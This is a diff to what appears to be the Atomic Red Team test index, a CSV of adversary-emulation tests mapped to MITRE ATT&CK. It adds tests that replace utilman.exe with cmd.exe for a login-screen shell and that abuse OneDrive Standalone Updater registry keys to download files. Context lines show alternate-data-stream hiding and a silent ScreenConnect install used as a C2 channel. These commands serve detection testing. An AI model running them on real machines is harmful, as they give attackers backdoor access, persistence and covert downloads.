@@ -6566,6 +6566,13 @@ reg add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs"" 
 ",command_prompt,True,,"reg delete ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test"" /f
 reg delete ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs"" /v Configuration /f
 ",,,
+T1546.008,Event Triggered Execution: Accessibility Features,Replace utilman.exe (Ease of Access Binary) with cmd.exe,1db380da-3422-481d-a3c8-6d5770dba580,"Replace utilman.exe (Ease of Access binary) with cmd.exe. This allows the user to launch an elevated command prompt by clicking the Ease of Access button on the login screen.
+",windows,,,"IF NOT EXIST C:\Windows\System32\utilman_backup.exe (copy C:\Windows\System32\utilman.exe C:\Windows\System32\utilman_backup.exe) ELSE ( pushd )
+takeown /F C:\Windows\System32\utilman.exe /A
+icacls C:\Windows\System32\utilman.exe /grant Administrators:F /t
+copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
+",command_prompt,True,,"copy /Y C:\Windows\System32\utilman_backup.exe C:\Windows\System32\utilman.exe
+",,,
 T1573,Encrypted Channel,OpenSSL C2,21caf58e-87ad-440c-a6b8-3ac259964003,"Thanks to @OrOneEqualsOne for this quick C2 method.
 This is to test to see if a C2 session can be established using an SSL socket.
 More information about this technique, including how to set up the listener, can be found here:
@@ -14974,7 +14981,8 @@ input_arguments.username.default: adversary
 
 "
 T1105,Ingress Tool Transfer,Windows pull file using sftp.exe,3d25f1f2-55cb-4a41-a523-d17ad4cfba19,"This test simulates pulling files using SFTP on a Windows environment.
-",windows,,,sftp.exe #{username}@#{remote_host}:#{remote_path} #{local_path},powershell,True,,,powershell,"dependencies.0.description: This test requires the `sftp` command to be available on the system.
+",windows,,,"sftp.exe #{username}@#{remote_host}:#{remote_path} #{local_path}
+",powershell,True,,,powershell,"dependencies.0.description: This test requires the `sftp` command to be available on the system.
 
 dependencies.0.prereq_command: if (Get-Command sftp -ErrorAction SilentlyContinue) {
     Write-Output ""SFTP command is available.""
@@ -15018,6 +15026,43 @@ input_arguments.username.description: User account to authenticate on remote hos
 input_arguments.username.type: string
 
 input_arguments.username.default: adversary
+
+"
+T1105,Ingress Tool Transfer,Download a file with OneDrive Standalone Updater,3dd6a6cf-9c78-462c-bd75-e9b54fc8925b,"Uses OneDrive Standalone Updater to download a file from a specified URL by setting up the required registry keys.
+This technique can be used to download files without executing anomalous executables.
+Reference: https://lolbas-project.github.io/lolbas/Binaries/OneDriveStandaloneUpdater/
+",windows,,,"if (-not (Test-Path ""#{onedrive_path}"")) {
+    Write-Host ""OneDriveStandaloneUpdater.exe not found at #{onedrive_path}. Test cannot continue.""
+    exit 1
+}
+
+New-Item -Path ""HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig"" -Force | Out-Null
+Set-ItemProperty -Path ""HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig"" -Name ""UpdateRingSettingURLFromOC"" -Value ""#{remote_url}"" -Type String -Force
+Set-ItemProperty -Path ""HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig"" -Name ""ODSUUpdateXMLUrlFromOC"" -Value ""#{remote_url}"" -Type String -Force
+Set-ItemProperty -Path ""HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig"" -Name ""UpdateXMLUrlFromOC"" -Value ""#{remote_url}"" -Type String -Force
+Set-ItemProperty -Path ""HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig"" -Name ""UpdateOfficeConfigTimestamp"" -Value 99999999999 -Type QWord -Force
+
+# Run OneDrive Standalone Updater
+& ""#{onedrive_path}""
+",powershell,False,,"Remove-Item -Path ""HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig"" -Force -ErrorAction Ignore
+Remove-Item -Path ""$env:LOCALAPPDATA\Microsoft\OneDrive\StandaloneUpdater\PreSignInSettingsConfig.json"" -Force -ErrorAction Ignore
+",powershell,"dependencies.0.description: OneDriveStandaloneUpdater.exe must exist on disk at specified location
+
+dependencies.0.prereq_command: if (Test-Path ""#{onedrive_path}"") {exit 0} else {exit 1}
+
+dependencies.0.get_prereq_command: Write-Host ""OneDriveStandaloneUpdater.exe not found at #{onedrive_path}. Please install OneDrive or specify correct path.""
+
+","input_arguments.remote_url.description: URL to download file from
+
+input_arguments.remote_url.type: url
+
+input_arguments.remote_url.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+
+input_arguments.onedrive_path.description: Path to OneDrive Standalone Updater executable
+
+input_arguments.onedrive_path.type: path
+
+input_arguments.onedrive_path.default: C:\Users\$env:USERNAME\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe
 
 "
 T1566.002,Phishing: Spearphishing Link,Paste and run technique,bc177ef9-6a12-4ebc-a2ec-d41e19c2791d,"Tests the **Paste and Run** technique, where users are tricked into running
@@ -17104,7 +17149,7 @@ print /D:#{path}\file.txt:autoruns.exe #{path}\Autoruns.exe
 reg export HKLM\SOFTWARE\Microsoft\Evilreg #{path}\file.txt:evilreg.reg
 regedit /E #{path}\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey
 expand \\webdav\folder\file.bat #{path}\file.txt:file.bat
-esentutl.exe /y #{path}\autoruns.exe /d #{path}\file.txt:autoruns.exe /o 
+esentutl.exe /y #{path}\autoruns.exe /d #{path}\file.txt:autoruns.exe /o
 ",command_prompt,True,,,,,"input_arguments.path.description: Path of ADS file
 
 input_arguments.path.type: path
@@ -17113,7 +17158,7 @@ input_arguments.path.default: c:\ADS\
 
 "
 T1564.004,Hide Artifacts: NTFS File Attributes,Store file in Alternate Data Stream (ADS),2ab75061-f5d5-4c1a-b666-ba2a50df5b02,"Storing files in Alternate Data Stream (ADS) similar to Astaroth malware.
-Upon execution cmd will run and attempt to launch desktop.ini. No windows remain open after the test
+Upon execution, cmd will run and attempt to launch desktop.ini. No windows remain open after the test
 ",windows,,,"if (!(Test-Path C:\Users\Public\Libraries\yanki -PathType Container)) {
     New-Item -ItemType Directory -Force -Path C:\Users\Public\Libraries\yanki
     }
@@ -17156,8 +17201,8 @@ input_arguments.ads_filename.type: string
 input_arguments.ads_filename.default: adstest.txt
 
 "
-T1564.004,Hide Artifacts: NTFS File Attributes,Create ADS PowerShell,0045ea16-ed3c-4d4c-a9ee-15e44d1560d1,"Create an Alternate Data Stream with PowerShell. Write access is required. To verify execution, the the command ""ls -Recurse | %{ gi $_.Fullname -stream *} | where stream -ne ':$Data' | Select-Object pschildname""
-in the %temp% direcotry to view all files with hidden data streams. To view the data in the alternate data stream, run ""notepad.exe T1564.004_has_ads_powershell.txt:adstest.txt"" in the %temp% folder.
+T1564.004,Hide Artifacts: NTFS File Attributes,Create ADS PowerShell,0045ea16-ed3c-4d4c-a9ee-15e44d1560d1,"Create an Alternate Data Stream with PowerShell. Write access is required. To verify execution, run the command ""ls -Recurse | %{ gi $_.Fullname -stream *} | where stream -ne ':$Data' | Select-Object pschildname""
+in the %temp% directory to view all files with hidden data streams. To view the data in the alternate data stream, run ""notepad.exe T1564.004_has_ads_powershell.txt:adstest.txt"" in the %temp% folder.
 ",windows,,,"echo ""test"" > #{file_name} | set-content -path test.txt -stream #{ads_filename} -value ""test""
 set-content -path #{file_name} -stream #{ads_filename} -value ""test2""
 set-content -path . -stream #{ads_filename} -value ""test3""
@@ -17181,8 +17226,8 @@ input_arguments.ads_filename.type: string
 input_arguments.ads_filename.default: adstest.txt
 
 "
-T1564.004,Hide Artifacts: NTFS File Attributes,Create Hidden Directory via $index_allocation,3e6791e7-232c-481c-a680-a52f86b83fdf,"Create an Alternate Data Stream Directory and File with the command prompt. Write access is required. Upon execution, 
-run ""dir /A /Q /R"" in the %temp% folder to view that the alternate data stream folder exists. To view the data in the  
+T1564.004,Hide Artifacts: NTFS File Attributes,Create Hidden Directory via $index_allocation,3e6791e7-232c-481c-a680-a52f86b83fdf,"Create an Alternate Data Stream Directory and File with the command prompt. Write access is required. Upon execution,
+run ""dir /A /Q /R"" in the %temp% folder to view that the alternate data stream folder exists. To view the data in the
 alternate data stream, run ""type %temp%\...$.......::$index_allocation\secrets.txt""
 ",windows,,,"md #{folder_name}
 echo too many secrets > #{folder_name}\#{hidden_filename}
@@ -29295,7 +29340,7 @@ Start-Process $file1 /S;
 T1219,Remote Access Software,ScreenConnect Application Download and Install on Windows,4a18cc4e-416f-4966-9a9d-75731c4684c0,"An adversary may attempt to trick the user into downloading ScreenConnect for use as a C2 channel. Download of ScreenConnect installer will be in the Downloads directory.
 Msiexec will be used to quietly insall ScreenConnect.
 ",windows,,,"$installer = ""C:\Users\$env:username\Downloads\ScreenConnect.msi""
-Invoke-WebRequest -OutFile $installer ""https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_21.11.4237.7885_Release.msi""
+Invoke-WebRequest -OutFile $installer ""https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_25.1.10.9197_Release.msi""
 msiexec /i $installer /qn
 ",powershell,True,,"$installer = ""C:\Users\$env:username\Downloads\ScreenConnect.msi""
 msiexec /x $installer /qn
